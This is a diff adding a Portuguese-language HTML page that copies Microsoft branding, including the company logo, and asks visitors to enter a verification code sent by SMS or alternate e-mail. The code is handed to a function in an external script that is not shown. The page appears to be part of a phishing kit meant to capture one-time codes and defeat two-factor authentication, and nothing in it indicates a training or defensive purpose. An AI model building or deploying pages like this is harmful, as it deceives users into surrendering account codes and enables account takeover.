@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Confirmação de Identidade</title>
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" />
+    <h2>Confirme sua identidade</h2>
+    <p>Para proteger sua conta, envie o código recebido por SMS ou e-mail alternativo.</p>
+    <form onsubmit="event.preventDefault(); verificarCodigo();">
+      <input type="text" id="codigo" placeholder="Digite o código" required />
+      <button type="submit">Verificar</button>
+    </form>
+    <a href="#">Não recebeu o código?</a>
+  </div>
+  <script src="js/confirmacao.js"></script>
+</body>
+</html>
